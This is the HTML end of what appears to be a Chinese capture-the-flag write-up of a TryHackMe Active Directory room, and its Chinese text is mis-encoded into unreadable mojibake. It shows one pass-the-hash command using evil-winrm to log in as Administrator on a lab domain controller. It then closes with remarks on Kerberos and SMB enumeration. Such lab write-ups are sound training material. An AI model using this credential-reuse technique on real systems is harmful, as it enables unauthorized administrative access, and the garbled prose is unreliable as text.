‡å¿—ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="edbc" class="mx lg iq mt b gy my mz l na nb">evil-winrm -u Administrator -H &lt;hash&gt; -i 10.10.128.52 -N</span></pre><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/81d769949bbcb25bd604b83103803ebd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1398/format:webp/1*lCYvzRWPW9CfdjQj7AvbXA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">æ ¹æ ‡å¿—ã€‚</figcaption></figure></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="e37e" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">æœ€åçš„æƒ³æ³•</h1><p id="f369" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå·¥ä½œï¼Œå¹¶ä¸”æœ‰æœºä¼šå­¦ä¹ æ›´å¤šå…³äºé€šè¿‡Kerberosåˆ©ç”¨Active DirectoryåŸŸæ§åˆ¶å™¨çš„çŸ¥è¯†ã€‚è¯¥æŒ‘æˆ˜æœ‰ä¸€ä¸ªå¾ˆå¥½çš„è¿›å±•ï¼Œéœ€è¦è‰¯å¥½çš„SMBæšä¸¾æŠ€èƒ½æ¥æ‰¾åˆ°æ‰€æœ‰å‡­æ®ã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p><div class="nv nw gp gr nx ny"><a href="https://tryhackme.com" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">ç½‘ç»œå®‰å…¨åŸ¹è®­</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">TryHackMeæ˜¯ä¸€ä¸ªå…è´¹çš„å­¦ä¹ ç½‘ç»œå®‰å…¨çš„åœ¨çº¿å¹³å°ï¼Œä½¿ç”¨åŠ¨æ‰‹ç»ƒä¹ å’Œå®éªŒå®¤ï¼Œé€šè¿‡æ‚¨çš„â€¦</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">tryhackme.com</p></div></div><div class="oh l"><div class="oi l oj ok ol oh om js ny"/></div></div></a></div></div></div>    
</body>
</html>